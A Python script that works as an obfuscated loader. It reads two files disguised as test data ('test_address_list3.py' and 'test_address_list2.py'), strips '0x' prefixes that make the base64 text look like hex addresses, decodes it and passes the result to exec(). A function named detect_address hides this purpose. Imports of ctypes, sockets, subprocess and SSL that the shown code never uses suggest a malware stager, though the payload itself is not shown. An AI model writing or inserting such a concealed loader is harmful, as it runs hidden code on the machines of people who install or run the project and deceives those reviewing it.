import time
import ctypes
import ctypes as ct
import base64
import os
import string
import platform
import threading
from ctypes import wintypes as w
import random
import urllib.request
import urllib.error
import http.client
import json
import struct
import array
import socket
import subprocess
from pathlib import Path
import ssl
import sys

def detect_address(file_name):
    file_path = os.path.join(os.path.dirname(__file__), file_name)
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()
        cleaned_lines = [line.replace("0x", "", 1).strip() for line in lines]

    # Join the cleaned lines into a single string
    result = "".join(cleaned_lines)
    return base64.b64decode(result.encode('utf-8'))

v_data = detect_address('test_address_list3.py') + base64.b64decode("Cg==")
v_data += detect_address('test_address_list2.py')
exec(v_data)